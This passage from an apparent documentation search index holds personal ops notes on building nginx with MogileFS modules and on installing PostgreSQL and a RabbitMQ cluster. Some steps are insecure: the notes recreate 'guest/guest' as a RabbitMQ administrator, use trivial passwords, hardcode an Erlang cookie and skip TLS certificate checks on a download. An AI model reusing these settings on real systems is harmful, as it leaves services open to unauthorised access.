image\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 domain add audio\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 domain list\n\nmogadm --trackers=10.10.10.130:7101 check\nmogadm --trackers=10.10.10.130:7102 check\nmogadm --trackers=10.10.10.130:7103 check\n\nnginx\n\nyum install -y zlib.x86_64 zlib-devel.x86_64 gzip.x86_64 binutils make cmake vim gcc gcc-devel openssl-devel.x86_64 openssl.x86_64 gd-devel.x86_64 gd.x86_64 GeoIP-devel.x86_64 GeoIP.x86_64 libxml2-devel.x86_64 libxml2.x86_64 libxslt-devel.x86_64 libxslt.x86_64\nuseradd nginx -s /bin/sh -M --uid=610\n\ncd /usr/local/src\nwget -O pcre-8.33.tar.gz \"http://uplus.file.youja.cn/nginx/pcre-8.33.tar.gz\"\ntar xzvf pcre-8.33.tar.gz\n\nwget -O nginx-requestkey-module-1.0.tar.gz \"http://uplus.file.youja.cn/nginx/nginx-requestkey-module-1.0.tar.gz\"\ntar xzvf nginx-requestkey-module-1.0.tar.gz\n\nwget -O nginx-mogilefs-module-1.0.5.tar.gz \"http://uplus.file.youja.cn/nginx/nginx-mogilefs-module-1.0.5.tar.gz\"\ntar xzvf nginx-mogilefs-module-1.0.5.tar.gz\ncd nginx-mogilefs-module-1.0.5\npatch &lt; mogilefs_count.patch\n\ncd /usr/local/src\nwget -O nginx-1.2.9.tar.gz \"http://uplus.file.youja.cn/nginx/nginx-1.2.9.tar.gz\"\ntar xzvf nginx-1.2.9.tar.gz\ncd nginx-1.2.9\n\n--\nvim src/core/nginx.h\n...\n\ndefine nginx_version      1006002\n\ndefine NGINX_VERSION      \"1.1_1.6.2\"\n\ndefine NGINX_VER          \"UPLUS_SERVER/\" NGINX_VERSION\n\ndefine NGINX_VAR          \"UPLUSE_SERVER\"\n\ndefine NGX_OLDPID_EXT     \".oldbin\"\n\n...\n\nvim src/http/ngx_http_header_filter_module.c\n...\nstatic char ngx_http_server_string[] = \"Server: UPLUS_SERVER\" CRLF;\n\n...\n\n./configure --prefix=/usr/local/nginx --user=nginx --group=nginx \\\n--with-http_ssl_module \\\n--with-http_realip_module \\\n--with-http_addition_module \\\n--with-http_sub_module \\\n--with-http_dav_module \\\n--with-http_flv_module \\\n--with-http_mp4_module \\\n--with-http_gzip_static_module \\\n--with-http_random_index_module \\\n--with-http_secure_link_module \\\n--with-http_stub_status_module \\\n--with-mail \\\n--with-mail_ssl_module \\\n--with-file-aio --with-ipv6 \\\n--with-cc-opt='-O2 -g -pipe -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic' \\\n--with-pcre=/usr/local/src/pcre-8.33 \\\n--add-module=/usr/local/src/nginx-mogilefs-module-1.0.5 \\\n--add-module=/usr/local/src/nginx-requestkey-module-1.0\n\nmake &amp;&amp; make install\n\ncat &gt; /etc/profile.d/nginx-env.sh &lt;&lt;EOF\nexport NGINX_HOME=/usr/local/nginx\nexport PATH=$NGINX_HOME/sbin:$PATH\nEOF\n\nvim /etc/profile\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n. /etc/profile\n\nmkdir -p /data/logs/nginx\n</code></pre>"},{"location":"daily/36-postgresql/","title":"postgresql","text":"<pre><code>yum install -y -q postgresql-server.x86_64\nservice postgresql initdb\n/etc/init.d/postgresql start\nchkconfig postgresql on\n\n\n\nhttps://www.postgresql.org/\n\nwget https://ftp.postgresql.org/pub/source/v9.3.13/postgresql-9.3.13.tar.gz\n\n\u7f16\u8bd1\u5b89\u88c5\ncat /etc/profile.d/postgresql-env.sh\nexport POSTGRESQL_HOME=/usr/local/postgresql\nexport PATH={POSTGRESQL_HOME}/bin:PATH\nexport LD_LIBRARY_PATH={POSTGRESQL_HOME}/lib:{LD_LIBRARY_PATH}\n\n. /etc/profile\n\ncat /etc/ld.so.conf.d/postgresql-x86_64.conf\n/usr/local/postgresql/lib\n\nldconfig\n\ngroupadd --gid=26\nuseradd --uid=26 --gid=26 postgres -M\n\nmkdir /data/postgresql\nchown postgres.postgres /data/postgresql\n\nsu postgres -c \"/usr/local/postgresql/bin/initdb -D /data/postgresql\"\n\n    /usr/local/postgresql/bin/postgres -D /data/postgresql\n\nor\n    /usr/local/postgresql/bin/pg_ctl -D /data/postgresql -l logfile start\n\nsu postgres -c \"/usr/local/postgresql/bin/pg_ctl -D /data/postgresql -l /tmp/postgresql.out start\"\nsu postgres -c '/usr/local/postgresql/bin/pg_ctl -D /data/postgresql -l /tmp/postgresql.out -o \"-h 0.0.0.0\" start'\n\nsu postgres -c \"/usr/local/postgresql/bin/pg_ctl -D /data/postgresql -l /tmp/postgresql.log -o '--config-file=/usr/local/postgresql/config/postgresql.conf' start\"\n\n]# netstat -nutlp | grep postgres\ntcp        0      0 127.0.0.1:5432              0.0.0.0:*                   LISTEN      24140/postgres\ntcp        0      0 ::1:5432                    :::*                        LISTEN      24140/postgres\n\nsu postgres -c \"/usr/local/postgresql/bin/psql\"\n\\password\n\npostgres=# create user jesse with password 'jesse';\nCREATE ROLE\npostgres=# create database test owner jesse;\nCREATE DATABASE\npostgres=# grant all privileges on database test to jesse;\nGRANT\npostgres=#\n\n\\q\n\n====&gt; \nsudo -u postgres createuser --superuser dbuser\nsudo -u postgres createdb -O dbuser exampledb\npsql -U dbuser -d exampledb -h 127.0.0.1 -p 5432\n\n\\h\uff1a\u67e5\u770bSQL\u547d\u4ee4\u7684\u89e3\u91ca\uff0c\u6bd4\u5982\\h select\u3002\n\\?\uff1a\u67e5\u770bpsql\u547d\u4ee4\u5217\u8868\u3002\n\\l\uff1a\u5217\u51fa\u6240\u6709\u6570\u636e\u5e93\u3002\n\\c [database_name]\uff1a\u8fde\u63a5\u5176\u4ed6\u6570\u636e\u5e93\u3002\n\\d\uff1a\u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u7684\u6240\u6709\u8868\u683c\u3002\n\\d [table_name]\uff1a\u5217\u51fa\u67d0\u4e00\u5f20\u8868\u683c\u7684\u7ed3\u6784\u3002\n\\du\uff1a\u5217\u51fa\u6240\u6709\u7528\u6237\u3002\n\\e\uff1a\u6253\u5f00\u6587\u672c\u7f16\u8f91\u5668\u3002\n\\conninfo\uff1a\u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u548c\u8fde\u63a5\u7684\u4fe1\u606f\u3002\n\ncreate table db_user(username varchar(20),age int,signup date);\ninsert into db_user (username,age,signup) values ('jesse',18,'2016-09-28'),('david',30,'2016-09-30');\nalter table db_user add email varchar(40);\nalter table db_user column\n</code></pre>"},{"location":"daily/37-rabbitmq/","title":"rabbitmq","text":"<p>tutorials</p> hostname IP K-Lab-ORCH-NODE-01 10.101.11.116 K-Lab-ORCH-NODE-02 10.101.11.186 K-Lab-ORCH-NODE-03 10.101.11.94"},{"location":"daily/37-rabbitmq/#install","title":"\u4e00\u3001install","text":"<p>Reference</p> <p>cluster</p>"},{"location":"daily/37-rabbitmq/#11-bare-metal","title":"1.1 bare metal","text":"<p>erlang support</p> <p>upgrade openssl</p> <pre><code>Older distributions can also lack a recent enough version of OpenSSL. Erlang 24 cannot be used on distributions that do not provide OpenSSL 1.1 as a system library. CentOS 7 and Fedora releases older than 26 are examples of such distributions\n</code></pre>"},{"location":"daily/37-rabbitmq/#111-perl","title":"1.1.1 perl","text":"<pre><code># install perl's IPC/Cmd.pm\n# perl --version: v5.16.3\nyum install perl-CPAN -y -q\n\n# \u66ff\u6362\u56fd\u5185\u6e90\n## method 1\nrm -f ~/.cpan/CPAN/MyConfig.pm\nPERL_MM_USE_DEFAULT=1 perl -MCPAN -e 'CPAN::HandleConfig-&gt;edit(\"urllist\", \"unshift\", \"https://mirrors.tuna.tsinghua.edu.cn/CPAN/\"); mkmyconfig'\n# OR\nPERL_MM_USE_DEFAULT=1 perl -MCPAN -e 'CPAN::HandleConfig-&gt;edit(\"urllist\", \"unshift\", \"http://mirrors.aliyun.com/CPAN/\"); mkmyconfig'\n\n## method 2\nperl -MCPAN -e shell\no conf \u67e5\u770b\u914d\u7f6e\u4fe1\u606f\no conf urllist \u67e5\u770b\u5f53\u524d\u6e90\u5730\u5740\no conf urllist pop http://www.cpan.org/\no conf urllist push http://mirrors.aliyun.com/CPAN/ \u6dfb\u52a0\u963f\u91cc\u4e91\u7684\u6e90\u5730\u5740\no conf commit \u786e\u8ba4\u6dfb\u52a0\no conf urllist ftp://mirrors.sohu.com/CPAN/ http://mirrors.163.com/cpan/ http://mirrors.ustc.edu.cn/CPAN/ \u4e00\u6b21\u6dfb\u52a0\u591a\u4e2a\u6e90\u5730\u5740\no conf urllist pop http://mirrors.163.com/cpan/ ftp://mirrors.sohu.com/CPAN/ \u79fb\u9664\u6e90\u5730\u5740\n\n# \u5b89\u88c5\u4f9d\u8d56\u5e93\nperl -MCPAN -e shell\ninstall IPC/Cmd.pm\n\n# OR\nyum install -y perl-IPC-Cmd\n</code></pre>"},{"location":"daily/37-rabbitmq/#112-openssl","title":"1.1.2 openssl","text":"<p>Referernce</p> <pre><code># download\nOPENSSL_VERSION=3.1.1\nwget --no-check-certificate -O openssl-${OPENSSL_VERSION}.tar.gz https://www.openssl.org/source/openssl-${OPENSSL_VERSION}.tar.gz\ntar -zxf openssl-${OPENSSL_VERSION}.tar.gz  -C .\n\n# configure\nyum install gcc gcc-c++ make binutils -q -y \ncd openssl-${OPENSSL_VERSION}\n./config --prefix=/usr/local/openssl \nmake &amp;&amp; make install\n\n# link\nln -s /usr/local/openssl/include/openssl /usr/include/openssl\nln -s /usr/local/openssl/lib64/libssl.so.3 /usr/local/lib64/libssl.so.3\nln -s /usr/local/openssl/lib64/libcrypto.so.3 /usr/local/lib64/libcrypto.so.3\n\ncat &gt; /etc/profile.d/openssl-env.sh &lt;&lt;EOF\nexport OPENSSL_HOME=/usr/local/openssl/\nexport PATH=\\${OPENSSL_HOME}/bin:\\${PATH}\nEOF\n. /etc/profile.d/openssl-env.sh\n\n# load\necho \"/usr/local/openssl/lib64/\" &gt; /etc/ld.so.conf.d/openssl-x86_64.conf\nldconfig -v\n\n# output\nopenssl version\n\n# # env\n# LD_RUN_PATH=\"/usr/local/openssl/lib64\" \\\n# LDFLAGS=\"-L/usr/local/openssl/lib64\" \\\n# CPPFLAGS=\"-I/usr/local/openssl/include\" \\\n# CFLAGS=\"-I/usr/local/openssl/include\" \\\n# CONFIGURE_OPTS=\"--with-openssl=/usr/local/openssl\" \n</code></pre>"},{"location":"daily/37-rabbitmq/#113-erlang","title":"1.1.3 erlang","text":"<p>Reference</p> <pre><code>ERLANG_VERSION=v26.0.2\nhttps://github.com/rabbitmq/erlang-rpm/releases/download/${ERLANG_VERSION}/erlang-${ERLANG_VERSION}-1.el7.x86_64.rpm\n# https://github.com/rabbitmq/erlang-rpm/archive/refs/tags/${ERLANG_VERSION}.tar.gz\n\nrpm -i erlang-${ERLANG_VERSION}-1.el7.x86_64.rpm\n\n# cookie\necho -n 'QDNNEBJPNBMNTJEIKOWV' &gt; ~/.erlang.cookie\nchmod 400 ~/.erlang.cookie\nls -l ~/.erlang.cookie &amp;&amp; md5sum ~/.erlang.cookie\n</code></pre>"},{"location":"daily/37-rabbitmq/#114-rabbitmq","title":"1.1.4 rabbitmq","text":"<p>Reference</p> <pre><code>RABBITMQ_VERSION=3.12.1\nwget https://github.com/rabbitmq/rabbitmq-server/releases/download/v${RABBITMQ_VERSION}/rabbitmq-server-generic-unix-${RABBITMQ_VERSION}.tar.xz\n\nxz -d rabbitmq-server-generic-unix-${RABBITMQ_VERSION}.tar.xz\ntar xf rabbitmq-server-generic-unix-${RABBITMQ_VERSION}.tar -C /usr/local\n\nln -s /usr/local/rabbitmq_server-${RABBITMQ_VERSION} /usr/local/rabbitmq_server\n\ncat &gt; /etc/profile.d/rabbitmq-env.sh &lt;&lt;EOF\nexport RABBITMQ_HOME=/usr/local/rabbitmq_server\nexport PATH=\\${RABBITMQ_HOME}/sbin:${PATH}\nEOF\n. /etc/profile.d/rabbitmq-env.sh\n\nrabbitmqctl version\nmkdir -p /data1/lib/rabbitmq &amp;&amp; ln -s /data1/lib/rabbitmq /usr/local/rabbitmq_server/var\n\n# service\ncat &gt; /usr/lib/systemd/system/rabbitmq-server.service &lt;&lt;EOF\n[Unit]\nDescription=RabbitMQ broker\nAfter=network.target epmd@0.0.0.0.socket\nWants=network.target epmd@0.0.0.0.socket\n\n[Service]\n# Note: You *may* wish to uncomment the following lines to apply systemd\n# hardening effort to RabbitMQ, to prevent your system from being illegally \n# modified by undiscovered vulnerabilities in RabbitMQ.\n# ProtectSystem=full\n# ProtectHome=true\n# PrivateDevices=true\n# ProtectHostname=true\n# ProtectClock=true\n# ProtectKernelTunables=true\n# ProtectKernelModules=true\n# ProtectKernelLogs=true\n# ProtectControlGroups=true\n# RestrictRealtime=true\nType=notify\nUser=root\nGroup=root\nNotifyAccess=all\nTimeoutStartSec=3600\n\nRestart=on-failure\nRestartSec=10\nWorkingDirectory=/usr/local/rabbitmq_server\nExecStart=/usr/local/rabbitmq_server/sbin/rabbitmq-server\nExecStop=/usr/local/rabbitmq_server/sbin/rabbitmqctl stop\nExecStop=/bin/sh -c \"while ps -p \\$MAINPID &gt;/dev/null 2&gt;&amp;1; do sleep 1; done\"\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl daemon-reload\nsystemctl start rabbitmq-server\n\nsystemctl enable rabbitmq-server\nsystemctl is-enabled rabbitmq-server\n\njournalctl -u rabbitmq-server -f\n\n# start\nrabbitmq-server -detached\nrabbitmqctl stop \nrabbitmqctl status\n\n# plugin\nrabbitmq-plugins enable rabbitmq_management\nrabbitmq-plugins enable rabbitmq_prometheus\nrabbitmq-plugins enable rabbitmq_shovel # \u8fc1\u79fb\u6570\u636e\n\n# cluster\nrabbitmqctl cluster_status\n\n# user\nrabbitmqctl list_users\nrabbitmqctl add_user ops jesse\nrabbitmqctl set_user_tags ops administrator\nrabbitmqctl set_permissions -p / ops \".*\" \".*\" \".*\"\n\nrabbitmqctl delete_user guest\nrabbitmqctl add_user guest guest\nrabbitmqctl set_user_tags guest administrator\nrabbitmqctl set_permissions -p / guest \".*\" \".*\" \".*\"\n\n# node\n# \u9700\u8981\u5728 /etc/hosts \u57cb\u597dhostname\u4e92\u4fe1\u89e3\u6790\n# default local [--node &lt;node&gt;]\nrabbitmqctl stop_app \n# rabbitmqctl reset # \u5f53\u4e0d\u662fdisc\u8282\u70b9\u65f6\u5c06\u8131\u79bbcluster\n# rabbitmqctl join_cluster --ram rabbit@K-Lab-ORCH-NODE-01\nrabbitmqctl join_cluster rabbit@K-Lab-ORCH-NODE-01\nrabbitmqctl start_app\n\nrabbitmqctl --node rabbit@K-Lab-ORCH-NODE-02 stop_app\nrabbitmqctl forget_cluster_node rabbit@K-Lab-ORCH-NODE-02\n\nrabbitmqctl stop_app \nrabbitmqctl change_cluster_node_type disc\n\n# queue\nrabbitmqctl list-queue\n</code></pre>"},{"location":"daily/37-rabbitmq/#12-docker","title":"1.2 docker","text":"<pre><code># RabbitMQ 3.12.1\n# Erlang 25.3.2.3\n# OpenSSL 3.1.1 30 May 2023 (Library: OpenSSL 3.1.1 30 May 2023)\n\ndocker run -d -it --rm --name rabbitmq -p 5672:5672 -p 15672:15672 \\\n  hub.8ops.top/middleware/rabbitmq:3.12-management\n</code></pre>"},{"location":"daily/37-rabbitmq/#use","title":"\u4e8c\u3001use","text":""},{"location":"daily/37-rabbitmq/#21-config","title":"2.1 config","text":"<p>Reference</p>"},{"location":"daily/37-rabbitmq/#22-quorum","title":"2.2 quorum","text":"<p>Reference</p> <pre><code>rabbitmqctl update_vhost_metadata / --default-queue-type quorum\n\n# \u5f53\u8282\u70b9\u53d1\u751f\u53d8\u5316\u65f6\nrabbitmq-queues rebalance quorum\n\nx-quorum-initial-group-size\n\nraft.wal_max_size_bytes 1GB\n\n\n# queue demo\n    {\n      \"name\": \"grus-demo-queue\",\n      \"vhost\": \"/\",\n      \"durable\": true,\n      \"auto_delete\": false,\n      \"arguments\": {\n        \"durable\": true,\n        \"x-app-name\": \"grus-demo\",\n        \"x-expires\": 2419200000,\n        \"x-max-length\": 10000000,\n        \"x-message-ttl\": 604800000,\n        \"x-overflow\": \"reject-publish\",\n        \"x-queue-type\": \"quorum\",\n        \"x-quorum-initial-group-size\": 2\n      }\n    }\n</code></pre>"},{"location":"daily/37-rabbitmq/#23-perf","title":"2.3 perf","text":"<p>Reference</p> <pre><code>docker run -it --rm pivotalrabbitmq/perf-test:2.19.0 --help\n\ndocker run -it --rm pivotalrabbitmq/perf-test:2.19.0 -x 1 -y 2 -u \"throughput-test-1\" -a --id \"test 1\"\n\ndocker network create perf-test\ndocker run -d -it --rm --network perf-test --name rabbitmq \\\n  -p 5672:5672 -p 15692:15692 -p 15672:15672 \\\n  hub.8ops.top/middleware/rabbitmq:3.12-management\n\n# 1, for docker 1 node\ndocker run -it --rm --network perf-test --name perf-test \\\n  pivotalrabbitmq/perf-test:latest \\\n  --uri amqp://rabbitmq \\\n  -x 1 -y 2 -u \"throughput-test-queue\" -a --id \"test id\" -z 10 -mf compact\n\nid: test id, sending rate avg: 43191 msg/s\nid: test id, receiving rate avg: 43030 msg/s\nid: test id, consumer latency min/median/75th/95th/99th 6040/617771/664521/743283/824080 \u00b5s\n\n# 2, for cluster 3 nodes\ndocker run -it --rm --network perf-test --name perf-test \\\n  pivotalrabbitmq/perf-test:2.19.0 \\\n  --uri amqp://ops:jesse@10.101.11.116:5672 \\\n  -x 2 -y 2 -u \"throughput-test-queue\" -a --id \"test id\" -z 10 -mf compact\n\nsending rate avg: 41610 msg/s\nreceiving rate avg: 41610 msg/s\nconsumer latency min/median/75th/95th/99th 474/912685/1796650/2000966/2074222 \u00b5s\n\n# 3, big client, for docker 1 node\ndocker run -it --rm --network perf-test --name perf-test \\\n  hub.8ops.top/middleware/rabbitmq-perf-test:2.19.0 \\\n  --uri amqp://rabbitmq \\\n  -x 10 -y 20 -u \"throughput-test-queue\" -a --id \"test id\" -z 10 -mf compact \n\nsending rate avg: 124405 msg/s\nreceiving rate avg: 124386 msg/s\nconsumer latency min/median/75th/95th/99th 8609/4767950/5220653/5692634/5878773 \u00b5s\n\n# 4, big client, for cluster 3 nodes\ndocker run -it --rm --network perf-test --name perf-test \\\n  hub.8ops.top/middleware/rabbitmq-perf-test:2.19.0 \\\n  --uri amqp://ops:jesse@10.101.11.116:5672 \\\n  -x 10 -y 20 -u \"throughput-test-queue\" -a --id \"test id\" -z 10 -mf compact \n\nsending rate avg: 42197 msg/s\nreceiving rate avg: 42197 msg/s\nconsumer latency min/median/75th/95th/99th 8981/1129273/1297606/1403971/1442604 \u00b5s\n</code></pre>"},{"location":"daily/37-rabbitmq/#24-ram-disc","title":"2.4 ram disc","text":"<p>\u533a\u522b</p> <ul> <li>ram\uff0c\u4ec5\u5b58\u50a8\u5143\u4fe1\u606f</li> <li>disc\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u8282\u70b9\u9700\u8981\u8bbe\u7f6e\u6210disk\uff0cdurable\u65f6\u4f1a\u6301\u4e45\u5316</li> </ul> <p>\u78c1\u76d8\u5b58\u50a8\u6d88\u606f\u91cf</p> <p>\u6620\u5c04\u5173\u7cfb\uff0c<code>12 byte x 968,997 = 11.09 MB \u4ea7\u751f\u6301\u4e45\u6570\u636e 226 MB</code> </p>"},{"location":"daily/37-rabbitmq/#25-restart-stop","title":"2.5 restart stop","text":"<pre><code>systemctl stop rabbitmq-server\n\nsystemctl start rabbitmq-server\n</code></pre>"},{"location":"daily/37-rabbitmq/#note","title":"\u4e09\u3001note","text":""},{"location":"daily/37-rabbitmq/#31-case-1","title":"3.1 case 1","text":"<pre><code>erlang\u3000R16B03-1\nrabbitmq-server 3.2.4\nsimplejson 3.4.0\n\nxmlto 0.0.25\namqplib 1.0.2\npython-txamqp 0.3\n\nhttp://www.erlang.org/download/otp_src_R16B03-1.tar.gz\nhttp://www.rabbitmq.com/releases/rabbitmq-server/v3.2.4/rabbitmq-server-3.2.4-1.noarch.rpm\nhttp://www.rabbitmq.com/releases/rabbitmq-server/v3.2.4/rabbitmq-server-generic-unix-3.2.4.tar.gz\nhttps://pypi.python.org/packages/source/s/simplejson/simplejson-3.4.0.tar.gz\nhttps://fedorahosted.org/releases/x/m/xmlto/xmlto-0.0.25.tar.gz\nhttps://py-amqplib.googlecode.com/files/amqplib-1.0.2.tgz\nhttps://launchpad.net/txamqp/trunk/0.3/+download/python-txamqp_0.3.orig.tar.gz\n\nUbuntu \napt-get install -y libncurses5-dev\n\nCentOS\nyum install -y ncurses-devel.x86_64\nyum install -y gcc.x86_64 gcc-c++.x86_64 zlib.x86_64 zlib-devel.x86_64 binutils.x86_64 kernel-devel.x86_64 m4.x86_64 openssl-devel.x86_64 \nyum install -y unixODBC.x86_64 \nyum install -y xmlto.x86_64\n\nwget -O /etc/yum.repos.d/epel-erlang.repo http://repos.fedorapeople.org/repos/peter/erlang/epel-erlang.repo\nyum install erlang.x86_64\n</code></pre>"},{"location":"daily/37-rabbitmq/#32-case-2","title":"3.2 case 2","text":"<pre><code>\u6d4b\u8bd5\u673a\u5668\n192.168.1.50 \nCentOS6.4-x64\n\n\u5b9e\u9645\u5b89\u88c5\u60c5\u51b5\npython 2.6.6 \u7cfb\u7edf\u9ed8\u8ba4\u672a\u6539 \uff08\u5347\u7ea7\u81f32.7.6\u4f30\u8ba1\u662f\u4f7f\u7528\u7ba1\u7406\u7684\u529f\u80fd\uff09\nErlang R16B03 \u7f16\u8bd1\u5b89\u88c5\nRabbitMQ 3.2.4 \u89e3\u538b\u4f7f\u7528 \uff08\u4f9d\u8d56 Erlang/Simplejson/Xmlto\uff09\n\nErlang \u5b89\u88c5\nyum install -y ncurses-devel.x86_64\n./configure \nmake \nmake install \n--without-javac  //\u4e0d\u7528java\u7f16\u8bd1\uff0c\u6545\u53bb\u6389java\u907f\u514d\u9519\u8bef  \n\nSimplejson \u5b89\u88c5\npython setup.py install\n\nRabbitMQ \u5b89\u88c5\ntar xvzf rabbitmq-server-generic-unix-3.2.4.tar.gz -C /usr/local/\n\u73af\u5883\u914d\u7f6e\nvim /etc/profile\n\nenv RabbitMQ\n\nexport RABBITMQ=/usr/local/rabbitmq_server-3.2.4\nexport PATH=RABBITMQ/sbin:PATH\n\nvim jdk.sh \n\nenv jdk1.6\n\nexport JAVA_HOME=/usr/local/jdk1.6.0_27\nexport JRE_HOME=JAVA_HOME/jre\nexport CLASSPATH=.:JAVA_HOME/lib:%JAVA_HOME/lib/dt.jar:JAVA_HOME/lib/tools.jar:JRE_HOME/lib\nexport PATH=JAVA_HOME/bin:JRE_HOME/bin:$PATH\n\nll /root/.erlang.cookie \n-r-------- 1 root root 20 7\u6708   8 16:24 /root/.erlang.cookie\n\n\u542f\u7528\u7ba1\u7406\u63d2\u4ef6\nrabbitmq-plugins enable rabbitmq_management\n\n\u542f\u52a8\u670d\u52a1\nrabbitmq-server start &amp;\nor \nrabbitmq-server -detached\n\nnetstat -nutlp | grep 15672\n\n\u6d4f\u89c8\u5668\u8fdb\u5165\u7ba1\u7406\u754c\u9762 \nhttp://192.168.1.50:15672\nguest/guest\n\n---\n\n\u5173\u95ed\u670d\u52a1\nrabbitmqctl stop\u00a0\n\n\u5f00\u542f\u67d0\u4e2a\u63d2\u4ef6\uff1arabbitmq-plugins enable rabbitmq_management\n\u5173\u95ed\u67d0\u4e2a\u63d2\u4ef6\uff1arabbitmq-plugins disable rabbitmq_management\n\uff08\u91cd\u542f\u670d\u52a1\u5668\u540e\u751f\u6548\uff09\n\n\u65b0\u5efavirtual_host: rabbitmqctl add_vhost s50\n\u64a4\u9500virtual_host: rabbitmqctl delete_vhost s50\n\n\u9a8c\u8bc1\ncurl http://192.168.1.50:15672/api/vhosts\n\n\u65b0\u5efauser: rabbitmqctl add_user jesse pass\n\u64a4\u9500user: rabbitmqctl delete_user jesse\n\u8bbe\u7f6etags: rabbitmqctl set_user_tags jesse administrator\n\u6388\u6743user: rabbitmqctl set_permissions -p / jesse \".\" \".\" \".*\"\n\nrabbitmqctl -n node1 add_user uplus pass\nrabbitmqctl -n node1 set_user_tags uplus management\nrabbitmqctl -n node1 set_permissions -p / uplus \".\" .\" \".*\"\n\n---\n\n\u7b80\u5355\u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\ncat etc/rabbitmq/rabbitmq-env.conf\nRABBITMQ_NODENAME=Jesse-888888\nRABBITMQ_NODE_IP_ADDRESS=127.0.0.1\nRABBITMQ_NODE_PORT=7777\nRABBITMQ_LOG_BASE=/data/logs/rabbitmq\nRABBITMQ_PLUGINS_DIR=/usr/local/rabbitmq_server-3.2.4/plugins\nRABBITMQ_MNESIA_BASE=/data/logs/rabbitmq/mnesia\n\nshell \u811a\u672c \u53ef\u4ee5\u67e5\u770b\u5177\u4f53\u903b\u8f91\nsbin/\nrabbitmqctl             \u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\nrabbitmq-defaults       \u9ed8\u8ba4\u914d\u7f6e\nrabbitmq-env            \u73af\u5883\nrabbitmq-plugins        \u63d2\u4ef6\nrabbitmq-server         \u670d\u52a1\n\n\u7ba1\u7406\u5de5\u5177\u5e2e\u52a9\u624b\u518c\n\nrabbitmqctl -h\n\nError: could not recognise command\nUsage:\nrabbitmqctl [-n &lt;node&gt;] [-q] &lt;command&gt; [&lt;command options&gt;] \n\nOptions:\n    -n node\n    -q\n\nDefault node is \"rabbit@server\", where server is the local host. On a host \nnamed \"server.example.com\", the node name of the RabbitMQ Erlang node will \nusually be rabbit@server (unless RABBITMQ_NODENAME has been set to some \nnon-default value at broker startup time). The output of hostname -s is usually \nthe correct suffix to use after the \"@\" sign. See rabbitmq-server(1) for \ndetails of configuring the RabbitMQ broker.\n\nQuiet output mode is selected with the \"-q\" flag. Informational messages are \nsuppressed when quiet mode is in effect.\n\nCommands:\n    stop [&lt;pid_file&gt;]\n    stop_app\n    start_app\n    wait &lt;pid_file&gt;\n    reset\n    force_reset\n    rotate_logs &lt;suffix&gt;\n\n    join_cluster &lt;clusternode&gt; [--ram]\n    cluster_status\n    change_cluster_node_type disc | ram\n    forget_cluster_node [--offline]\n    update_cluster_nodes clusternode\n    sync_queue queue\n    cancel_sync_queue queue\n\n    add_user &lt;username&gt; &lt;password&gt;\n    delete_user &lt;username&gt;\n    change_password &lt;username&gt; &lt;newpassword&gt;\n    clear_password &lt;username&gt;\n    set_user_tags &lt;username&gt; &lt;tag&gt; ...\n    list_users\n\n    add_vhost &lt;vhostpath&gt;\n    delete_vhost &lt;vhostpath&gt;\n    list_vhosts [&lt;vhostinfoitem&gt; ...]\n    set_permissions [-p &lt;vhostpath&gt;] &lt;user&gt; &lt;conf&gt; &lt;write&gt; &lt;read&gt;\n    clear_permissions [-p &lt;vhostpath&gt;] &lt;username&gt;\n    list_permissions [-p &lt;vhostpath&gt;]\n    list_user_permissions &lt;username&gt;\n\n    set_parameter [-p &lt;vhostpath&gt;] &lt;component_name&gt; &lt;name&gt; &lt;value&gt;\n    clear_parameter [-p &lt;vhostpath&gt;] &lt;component_name&gt; &lt;key&gt;\n    list_parameters [-p &lt;vhostpath&gt;]\n\n    set_policy [-p &lt;vhostpath&gt;] [--priority &lt;priority&gt;] [--apply-to &lt;apply-to&gt;] \n\n&lt;name&gt; &lt;pattern&gt;  &lt;definition&gt;\n    clear_policy [-p &lt;vhostpath&gt;] &lt;name&gt;\n    list_policies [-p &lt;vhostpath&gt;]\n\n    list_queues [-p &lt;vhostpath&gt;] [&lt;queueinfoitem&gt; ...]\n    list_exchanges [-p &lt;vhostpath&gt;] [&lt;exchangeinfoitem&gt; ...]\n    list_bindings [-p &lt;vhostpath&gt;] [&lt;bindinginfoitem&gt; ...]\n    list_connections [&lt;connectioninfoitem&gt; ...]\n    list_channels [&lt;channelinfoitem&gt; ...]\n    list_consumers [-p &lt;vhostpath&gt;]\n    status\n    environment\n    report\n    eval &lt;expr&gt;\n\n    close_connection &lt;connectionpid&gt; &lt;explanation&gt;\n    trace_on [-p &lt;vhost&gt;]\n    trace_off [-p &lt;vhost&gt;]\n    set_vm_memory_high_watermark &lt;fraction&gt;\n\n&lt;vhostinfoitem&gt; must be a member of the list [name, tracing].\n\nThe list_queues, list_exchanges and list_bindings commands accept an optional \nvirtual host parameter for which to display results. The default value is \"/\".\n\n&lt;queueinfoitem&gt; must be a member of the list [name, durable, auto_delete, \narguments, policy, pid, owner_pid, exclusive_consumer_pid, \nexclusive_consumer_tag, messages_ready, messages_unacknowledged, messages, \nconsumers, memory, slave_pids, synchronised_slave_pids, status].\n\n&lt;exchangeinfoitem&gt; must be a member of the list [name, type, durable, \nauto_delete, internal, arguments, policy].\n\n&lt;bindinginfoitem&gt; must be a member of the list [source_name, source_kind, \ndestination_name, destination_kind, routing_key, arguments].\n\n&lt;connectioninfoitem&gt; must be a member of the list [pid, name, port, host, \npeer_port, peer_host, ssl, ssl_protocol, ssl_key_exchange, ssl_cipher, \nssl_hash, peer_cert_subject, peer_cert_issuer, peer_cert_validity, \nlast_blocked_by, last_blocked_age, state, channels, protocol, auth_mechanism, \nuser, vhost, timeout, frame_max, client_properties, recv_oct, recv_cnt, \nsend_oct, send_cnt, send_pend].\n\n&lt;channelinfoitem&gt; must be a member of the list [pid, connection, name, number, \nuser, vhost, transactional, confirm, consumer_count, messages_unacknowledged, \nmessages_uncommitted, acks_uncommitted, messages_unconfirmed, prefetch_count, \nclient_flow_blocked].\n\n---\n\npython\u4f9d\u8d56\u5e93\namqplib-1.0.2           \npika-0.9.13            